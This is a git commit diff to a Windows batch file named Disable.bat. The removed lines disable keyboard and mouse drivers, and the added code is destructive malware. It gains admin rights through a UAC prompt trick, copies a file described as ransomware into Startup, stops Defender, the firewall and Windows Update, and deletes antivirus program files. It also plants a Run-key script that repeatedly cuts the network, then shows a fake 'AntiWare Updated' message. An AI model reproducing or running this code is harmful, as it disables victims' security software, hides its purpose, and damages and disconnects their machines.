62c0ffb5f068ad897b193fad03e360331eccfd6b
Chai <83523587+CPScript@users.noreply.github.com>
2023-02-10 17:01:28 -0500

    Update Disable.bat

--- Disable.bat
+++ Disable.bat
@@ -1,4 +1,60 @@
-REM Starting: win update
-SET SERVICES=HKLMSYSTEMCurrentControlSetServices
-REG ADD %SERVICES%kbdclass /v Start /t REG_DWORD /d 4 /f
-REG ADD %SERVICES%mouclass /v Start /t REG_DWORD /d 4 /f
+COLOR 4C
+
+:: give admin
+
+set "params=%*"
+cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
+
+
+
+
+:: Copys ransom to startup
+
+XCOPY "invisible.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+
+
+
+
+:: Disable antivirus, firewall, taskmanager, to make sure your not going to get out of this...
+
+net stop "SDRSVC"
+net stop "WinDefend"
+taskkill /f /t /im "MSASCui.exe"
+net stop "security center"
+netsh firewall set opmode mode-disable
+net stop "wuauserv"
+net stop "Windows Defender Service"
+net stop "Windows Firewall"
+net stop sharedaccess
+
+del /Q /F C:\Program Files\alwils~1\avast4\*.*
+del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe
+del /Q /F C:\Program Files\kasper~1\*.exe
+del /Q /F C:\Program Files\trojan~1\*.exe
+del /Q /F C:\Program Files\f-prot95\*.dll
+del /Q /F C:\Program Files\tbav\*.dat
+del /Q /F C:\Program Files\avpersonal\*.vdf
+del /Q /F C:\Program Files\Norton~1\*.cnt
+del /Q /F C:\Program Files\Mcafee\*.*
+del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.*
+del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.*
+del /Q /F C:\Program Files\Norton~1\Norton~1\*.*
+del /Q /F C:\Program Files\Norton~1\*.*
+
+
+
+
+:: REMOVES INTERNET (Will not let you reconect)
+
+echo @echo off>c:windowswimn32.bat
+echo break off>>c:windowswimn32.bat
+echo ipconfig/release_all>>c:windowswimn32.bat
+echo end>>c:windowswimn32.bat
+reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
+reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
+echo Loading...
+echo Internet AntiWare Updated!
+echo You have been disconected from the internet and wont be able to reconect for a bit...
+PAUSE
+@echo off
+cls
